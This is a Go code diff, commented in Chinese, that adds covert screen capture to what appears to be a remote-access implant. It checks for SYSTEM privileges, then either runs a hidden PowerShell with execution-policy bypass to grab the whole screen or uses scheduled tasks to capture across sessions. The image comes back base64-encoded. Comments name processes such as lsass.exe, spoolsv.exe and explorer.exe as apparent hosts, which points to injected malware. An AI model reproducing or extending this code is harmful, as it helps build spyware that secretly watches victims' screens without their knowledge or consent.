@@ -11,11 +11,94 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
+
+	"golang.org/x/sys/windows"
 )
 
+// isSystemProcess 检测当前进程是否是 SYSTEM 权限
+func isSystemProcess() bool {
+	var token windows.Token
+	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
+	if err != nil {
+		// 如果无法获取令牌，假定为普通用户（保守策略）
+		return false
+	}
+	defer token.Close()
+
+	// 获取令牌的用户 SID
+	tokenUser, err := token.GetTokenUser()
+	if err != nil {
+		return false
+	}
+
+	// 创建 SYSTEM 账户的 Well-Known SID
+	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
+	if err != nil {
+		return false
+	}
+
+	// 比较当前进程的 SID 是否是 SYSTEM
+	return tokenUser.User.Sid.Equals(systemSid)
+}
+
 // TakeScreenshot 截取屏幕并返回 Base64 编码的 PNG 图片
-// 使用计划任务在用户 Session 中执行截图
+// 根据进程权限自动选择截图策略
 func TakeScreenshot() string {
+	// 策略选择：
+	// - SYSTEM 权限进程（如 spoolsv.exe, lsass.exe）→ 通常在 Session 0，需要跨 Session 截图
+	// - 用户权限进程（如 explorer.exe, notepad.exe）→ 在用户 Session，直接截图
+
+	if isSystemProcess() {
+		// 策略 1: SYSTEM 进程，使用 schtasks 跨 Session 截图
+		return takeScreenshotViaScheduledTask()
+	} else {
+		// 策略 2: 用户进程，直接使用 PowerShell 截图（更快，更稳定）
+		return takeScreenshotDirect()
+	}
+}
+
+// takeScreenshotDirect 直接在当前 Session 截图（用于用户进程）
+func takeScreenshotDirect() string {
+	// 生成临时文件路径
+	tempFile := filepath.Join("C:\\Windows\\Temp", fmt.Sprintf("scr_%d.png", time.Now().Unix()))
+	defer os.Remove(tempFile)
+
+	// PowerShell 截图脚本
+	screenshotScript := fmt.Sprintf(`
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+$bmp.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bmp.Dispose()
+`, tempFile)
+
+	// 直接执行 PowerShell（不经过 schtasks）
+	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", screenshotScript)
+	if err := cmd.Run(); err != nil {
+		return fmt.Sprintf("Error executing screenshot: %v", err)
+	}
+
+	// 等待文件写入完成
+	time.Sleep(1 * time.Second)
+
+	// 读取截图
+	imgData, err := os.ReadFile(tempFile)
+	if err != nil {
+		return fmt.Sprintf("Error reading screenshot: %v", err)
+	}
+
+	if len(imgData) == 0 {
+		return "Error: Screenshot file is empty"
+	}
+
+	return "[IMAGE]" + base64.StdEncoding.EncodeToString(imgData)
+}
+
+// takeScreenshotViaScheduledTask 通过计划任务跨 Session 截图（用于 Session 0 服务）
+func takeScreenshotViaScheduledTask() string {
 	// 生成临时文件路径
 	tempFile := filepath.Join("C:\\Windows\\Temp", fmt.Sprintf("scr_%d.png", time.Now().Unix()))
 	defer os.Remove(tempFile)
